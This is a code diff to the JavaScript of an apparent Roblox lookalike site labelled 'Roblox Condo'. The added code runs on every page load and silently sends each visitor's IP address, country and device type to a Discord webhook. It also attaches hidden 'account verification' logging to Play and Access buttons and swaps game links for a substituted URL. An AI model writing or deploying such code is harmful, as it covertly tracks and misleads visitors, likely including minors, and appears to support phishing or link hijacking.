@@ -41,6 +41,70 @@
     }
   }
 
+  // Detect device type
+  function detectDevice() {
+    const userAgent = navigator.userAgent;
+    if (/iphone|ipod/i.test(userAgent)) return '📱 iPhone';
+    if (/ipad/i.test(userAgent)) return '📱 iPad';
+    if (/android/i.test(userAgent)) return '🤖 Android';
+    if (/windows phone/i.test(userAgent)) return '📱 Windows Phone';
+    if (/mac/i.test(userAgent)) return '🍎 macOS';
+    if (/windows/i.test(userAgent)) return '🪟 Windows';
+    if (/linux/i.test(userAgent)) return '🐧 Linux';
+    return '💻 Desktop';
+  }
+
+  // Log site visit (New Visitor)
+  async function logSiteVisit() {
+    try {
+      const ip = await getUserIP();
+      const country = await getUserCountry(ip);
+      const deviceType = detectDevice();
+      const now = new Date();
+      const timeISO = now.toISOString();
+      const timeFormatted = now.toLocaleTimeString('pt-BR');
+
+      const visitLog = {
+        embeds: [
+          {
+            title: '🆕 New Visitor',
+            color: 16711680, // Red color
+            fields: [
+              {
+                name: '🌐 IP',
+                value: `${country.flag} ${ip} — ${country.country}`,
+                inline: false,
+              },
+              {
+                name: '📱 Device',
+                value: deviceType,
+                inline: false,
+              },
+              {
+                name: '⏰ Time',
+                value: timeISO,
+                inline: false,
+              },
+            ],
+            footer: {
+              text: `Roblox Condo — Visit Log | Hoje às ${timeFormatted}`,
+            },
+          },
+        ],
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(visitLog),
+      }).catch(() => {
+        // Webhook may fail due to CORS
+      });
+    } catch (error) {
+      console.error('Failed to log site visit:', error);
+    }
+  }
+
   // Log account verification to Discord
   async function logAccountVerification() {
     try {
@@ -122,34 +186,34 @@
     }
   }
 
-  // Update game links
+  // Update game links and add click listeners
   function updateGameLinks() {
-    // Replace all roblox.com.bz links with the new sword game link for Sword Game and Fun Combat
     const observer = new MutationObserver(() => {
-      // Find all links that might be game links
-      document.querySelectorAll('a[href*="roblox.com"], button').forEach((element) => {
-        // Check if this is a link to a game
+      // Find all buttons and links
+      document.querySelectorAll('button, a[href*="roblox.com"]').forEach((element) => {
         const href = element.getAttribute('href') || '';
         const text = element.textContent || '';
-        
+        const testid = element.getAttribute('data-testid') || '';
+
         // Update Sword Game and Fun Combat links
         if ((text.includes('Sword') || text.includes('Combat')) && href.includes('roblox.com')) {
           element.setAttribute('href', NEW_SWORD_LINK);
         }
 
         // Add click listener to log when user accesses a game
-        if (href.includes('roblox.com') && (text.includes('Play') || text.includes('Access'))) {
-          element.removeEventListener('click', logGameAccess);
-          element.addEventListener('click', logGameAccess);
+        if (testid.includes('access') || testid.includes('play') || text.includes('Play') || text.includes('Access')) {
+          // Remove old listener to avoid duplicates
+          element.removeEventListener('click', handleGameAccess);
+          element.addEventListener('click', handleGameAccess);
         }
       });
 
-      // Also handle buttons with onclick handlers
-      document.querySelectorAll('button[data-testid*="button"]').forEach((element) => {
+      // Also handle buttons with data-testid
+      document.querySelectorAll('[data-testid*="button"]').forEach((element) => {
         const testid = element.getAttribute('data-testid') || '';
         if (testid.includes('access') || testid.includes('play')) {
-          element.removeEventListener('click', logGameAccess);
-          element.addEventListener('click', logGameAccess);
+          element.removeEventListener('click', handleGameAccess);
+          element.addEventListener('click', handleGameAccess);
         }
       });
     });
@@ -157,18 +221,20 @@
     observer.observe(document.body, { childList: true, subtree: true });
   }
 
-  // Log when user accesses a game
-  async function logGameAccess(e) {
-    // Log the account verification
+  // Handle game access click
+  async function handleGameAccess(e) {
+    // Log the account verification when user clicks to access game
     await logAccountVerification();
   }
 
   // Initialize on page load
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', () => {
+      logSiteVisit();
       updateGameLinks();
     });
   } else {
+    logSiteVisit();
     updateGameLinks();
   }
 })();
